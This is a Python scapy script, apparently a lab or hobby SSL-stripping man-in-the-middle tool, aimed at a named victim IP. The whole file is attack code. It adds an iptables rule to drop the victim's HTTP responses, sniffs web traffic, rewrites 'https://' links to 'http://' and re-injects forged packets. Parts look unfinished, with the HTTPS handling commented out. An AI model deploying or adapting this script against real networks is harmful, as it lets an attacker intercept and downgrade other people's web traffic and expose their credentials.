from scapy.all import *

ip_victim = "10.0.123.8"

def decode_payload(raw_data):
    try:
        return raw_data.decode('utf-8', errors='ignore')
    except UnicodeDecodeError as e:
        print("Error decoding: {}".format(e))
        return raw_data.decode('utf-8', errors='replace')

def encode_payload(raw_data):
    try:
        return raw_data.encode('utf-8', errors='ignore')
    except UnicodeEncodeError as e:
        print("Error encoding: {}".format(e))
        return raw_data.encode('utf-8', errors='replace')

def block_http_response(target_ip):
    command = "sudo iptables -I FORWARD 1 -d " + target_ip + " -p tcp --sport 80 -j DROP"
    os.system(command)

# Cleanup the iptables rules before starting and after ending
def cleanup_http_response(target_ip):
    command = "sudo iptables -D FORWARD -d " + target_ip + " -p tcp --sport 80 -j DROP"
    os.system(command)

def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        ip_layer = pkt[IP]
        tcp_layer = pkt[TCP]
        raw_data = pkt[Raw].load
        decoded_data = decode_payload(raw_data)

        # Check if the packet if HTTP (port 80) and modify to HTTPS (port 443)
        if tcp_layer.dport == 80:
            if b"HTTP" in raw_data:
                

                print("[+] HTTP Packet intercepted to port 80: {}".format(decoded_data))
                
                print("Source port: " + str(tcp_layer.sport))
                print("Destination port: " + str(tcp_layer.dport))
                
                modified_payload = decoded_data.replace("http://", "https://")                

                new_packet =    IP(dst=ip_layer.dst, src=ip_layer.src) / \
                                TCP(dport=tcp_layer.dport, sport=tcp_layer.sport, 
                                seq=tcp_layer.seq, ack=tcp_layer.ack, 
                                flags=tcp_layer.flags) / \
                                Raw(load=encode_payload(modified_payload))
                
                # Modify the destination port to 443
                #tcp_layer.dport = 443

                # Recalculate the checksum
                del new_packet[IP].chksum
                del new_packet[TCP].chksum

                # Send the modified packet
                send(new_packet, iface="enp0s10", verbose=0)
                print("[+] Modifed Packet REQUEST: {}".format(new_packet[Raw].load.decode('utf-8', errors='ignore')))
                print("\n")
        
        elif tcp_layer.sport == 80:
            if b"HTTP" in raw_data:
                print("[+] HTTP Packet intercepted from port 80: {}".format(decoded_data))
                
                print("Source port: " + str(tcp_layer.sport))
                print("Destination port: " + str(tcp_layer.dport))
                
                modified_payload = decoded_data.replace("https://", "http://")                

                new_packet =    IP(dst=ip_layer.dst, src=ip_layer.src) / \
                                TCP(dport=tcp_layer.dport, sport=tcp_layer.sport, 
                                seq=tcp_layer.seq, ack=tcp_layer.ack, 
                                flags=tcp_layer.flags) / \
                                Raw(load=encode_payload(modified_payload))
                
                # Modify the destination port to 443
                #tcp_layer.dport = 443

                # Recalculate the checksum
                del new_packet[IP].chksum
                del new_packet[TCP].chksum

                # Send the modified packet
                send(new_packet, iface="enp0s10", verbose=0)
                print("[+] Modifed Packet RESPONSE: {}".format(new_packet[Raw].load.decode('utf-8', errors='ignore')))
                print("\n")

        elif (tcp_layer.dport == 443 or tcp_layer.sport == 443):
            print("[*] Intercepted HTTPS Packet: ")
            
            # Modify the destination port to 80
            #tcp_layer.dport = 80

            # Recalculate the checksum
            del tcp_layer.chksum
            del ip_layer.chksum

            # Send the modified packet
            #send(pkt, iface="enp0s10", verbose=0)
            print("Packet redirected to port 80")

def main():
    print("Start sniffing packets. Press CTRL+C to stop.")
    try:
        block_http_response(ip_victim)
        sniff(  filter="tcp port 80 or tcp port 443", iface="enp0s10", prn=packet_callback, store=0)
    except KeyboardInterrupt:
        print("Stopped")
    finally:
        cleanup_http_response(ip_victim)
        print("Cleaned up rule")

if __name__ == "__main__":
    main()